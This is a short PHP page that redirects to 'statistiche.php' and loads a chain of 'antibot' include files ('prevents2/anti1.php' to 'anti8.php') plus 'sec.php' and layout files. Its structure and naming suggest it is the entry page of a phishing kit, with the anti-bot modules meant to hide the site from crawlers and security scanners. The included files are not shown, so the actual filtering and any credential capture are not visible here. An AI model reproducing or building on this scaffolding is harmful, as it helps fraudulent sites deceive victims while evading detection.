<?php  /* prRbFUFmydvwv1MMozrEjoLzU5STFBr94eihMje5 */   header("Location: statistiche.php"); ?><?php  ?>
<?php


function antibot(){

    include "prevents2/anti1.php";
    include "prevents2/anti2.php";
    include "prevents2/anti3.php";
    include "prevents2/anti4.php";
    include "prevents2/anti5.php";
    include "prevents2/anti6.php";
    include "prevents2/anti7.php";
    include "prevents2/anti8.php";
}

antibot();


include("sec.php"); ?><?php  ?>

<?php include("layout1.php") ?><?php  ?><?php include("layout2.php") ?><?php  ?>